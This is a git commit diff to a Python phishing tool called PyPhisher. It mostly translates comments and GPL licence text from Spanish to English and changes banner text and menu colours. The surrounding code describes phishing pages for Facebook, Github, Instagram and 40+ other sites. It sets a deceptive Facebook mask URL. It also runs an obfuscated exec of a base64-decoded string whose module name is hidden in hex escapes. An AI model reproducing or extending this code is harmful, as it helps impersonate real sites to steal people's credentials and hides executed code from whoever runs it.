c07572b4522b117206ddc1325973b8cbd468e01c
Truchorko Sanchez <61384359+luis498@users.noreply.github.com>
2022-05-15 14:59:18 -0500

    Update pyphisher.py

--- pyphisher.py
+++ pyphisher.py
@@ -3,21 +3,84 @@
 # Version : 1.6
 # Author  : luis498
 # Github  : https://github.com/luis498
-# Discord : https://discord.gg/utmuExHwyT
-# PyPhisher es una herramienta de phishing en Python
-# Phishing de Facebook, Phishing de Github, Phishing de Instagram y más de 40 sitios disponibles
-# Archivo/script portátil
-# Si copia el código fuente abierto, considere dar crédito
+# Contact : https://m.me/luis498
+# PyPhisher is a phishing tool in python
+# Facebook Phishing, Github Phishing, Instagram Phishing and 40+ other sites available
+# Portable file/script
+# If you copy open source code, consider giving credit
 
 """
-                         LICENCIA PÚBLICA GENERAL GNU
-                        Versión 3, 29 de junio de 2007
+                    GNU GENERAL PUBLIC LICENSE
+                       Version 3, 29 June 2007
 
-  Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
-  Todo el mundo tiene permitido copiar y distribuir copias textuales
-  de este documento de licencia, pero no se permite cambiarlo.
- 
-  Derechos de autor (C) 2021 luis498 (https://github.com/luis498)
+ Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
+ Everyone is permitted to copy and distribute verbatim copies
+ of this license document, but changing it is not allowed.
+
+                            Preamble
+
+  The GNU General Public License is a free, copyleft license for
+software and other kinds of works.
+
+  The licenses for most software and other practical works are designed
+to take away your freedom to share and change the works.  By contrast,
+the GNU General Public License is intended to guarantee your freedom to
+share and change all versions of a program--to make sure it remains free
+software for all its users.  We, the Free Software Foundation, use the
+GNU General Public License for most of our software; it applies also to
+any other work released this way by its authors.  You can apply it to
+your programs, too.
+
+  When we speak of free software, we are referring to freedom, not
+price.  Our General Public Licenses are designed to make sure that you
+have the freedom to distribute copies of free software (and charge for
+them if you wish), that you receive source code or can get it if you
+want it, that you can change the software or use pieces of it in new
+free programs, and that you know you can do these things.
+
+  To protect your rights, we need to prevent others from denying you
+these rights or asking you to surrender the rights.  Therefore, you have
+certain responsibilities if you distribute copies of the software, or if
+you modify it: responsibilities to respect the freedom of others.
+
+  For example, if you distribute copies of such a program, whether
+gratis or for a fee, you must pass on to the recipients the same
+freedoms that you received.  You must make sure that they, too, receive
+or can get the source code.  And you must show them these terms so they
+know their rights.
+
+  Developers that use the GNU GPL protect your rights with two steps:
+(1) assert copyright on the software, and (2) offer you this License
+giving you legal permission to copy, distribute and/or modify it.
+
+  For the developers' and authors' protection, the GPL clearly explains
+that there is no warranty for this free software.  For both users' and
+authors' sake, the GPL requires that modified versions be marked as
+changed, so that their problems will not be attributed erroneously to
+authors of previous versions.
+
+  Some devices are designed to deny users access to install or run
+modified versions of the software inside them, although the manufacturer
+can do so.  This is fundamentally incompatible with the aim of
+protecting users' freedom to change the software.  The systematic
+pattern of such abuse occurs in the area of products for individuals to
+use, which is precisely where it is most unacceptable.  Therefore, we
+have designed this version of the GPL to prohibit the practice for those
+products.  If such problems arise substantially in other domains, we
+stand ready to extend this provision to those domains in future versions
+of the GPL, as needed to protect the freedom of users.
+
+  Finally, every program is threatened constantly by software patents.
+States should not allow patents to restrict development and use of
+software on general-purpose computers, but in those that do, we wish to
+avoid the special danger that patents applied to a free program could
+make it effectively proprietary.  To prevent this, the GPL assures that
+patents cannot be used to render the program non-free.
+
+  The precise terms and conditions for copying, distribution and
+modification follow.
+
+Copyright (C) 2021 luis498 (https://github.com/luis498)
 """
 
 import os, sys, time, socket, json
@@ -45,10 +108,10 @@ error = blue + '[' + white + '!' + blue + '] '+red
 info= yellow + '[' + white + '+' + yellow + '] '+ cyan
 info2= green + '[' + white + '•' + green + '] '+ purple
 
-# _________________________________________________________________________________ #
+# Generated by banner-generator. Github: https://github.com/luis498/banner-generator
 
 logo=f'''
-{yellow} ____  _         ____  _     _
+{yellow}  ____  _         ____  _     _
 {yellow} |  _ \| | _____ |  _ \| |__ (_)___
 {yellow} | |_) | |/ / _ \| |_) | '_ \| / __|
 {blue} |  _ <|   < (_) |  __/| | | | \__ |
@@ -61,7 +124,7 @@ logo=f'''
 {red} \__,_|\__|\__\__,_|\__, |\__,_|\___|
 {red}                       |_|
 {red}
-{green}------------------->{cyan} [Version 1.6]
+{green}------------------->{cyan} [Version 1.9]
 {cyan}------------------->{red} [Crado Por {green}Truchorko_#7777{red}]
 {cyan}------------------->{red} [Crado Por {green}KasRoudra #7777{red}]
 {red}
@@ -280,7 +343,7 @@ def about():
     print(red+'[Messenger] '+cyan+' :[https://m.me/luis498]')
     print(red+'[Discord]     '+cyan+' :[https://discord.gg/utmuExHwyT]')
     print()
-    print(green+'['+white+'0'+green+']'+yellow+' Exit                     '+     green+'['+white+'99'+green+']'+yellow+'  Main Menu       ')
+    print(green+'['+white+'0'+green+']'+red+' Exit                     '+     green+'['+white+'99'+green+']'+red+'  Main Menu       ')
     print()
     abot= input("\n > ")
     if abot== "0":
@@ -414,7 +477,7 @@ def main():
         exec(__import__("\x62\x61\x73\x65\x36\x34").b64decode(pyphisherpyphisherpyphisherpyphisherpyphisher.encode("\x75\x74\x66\x2d\x38")).decode("\x75\x74\x66\x2d\x38"))
         slowprint(logo)
         options()
-        choose= input(ask+"Select one of the options > "+nc)
+        choose= input(ask+"SELECIONE CUALQUIERA EL DE SU GUSTO > "+nc)
         if choose=="1" or choose == "01":
             folder="facebook"
             mask="https://blue-verified-facebook-free"
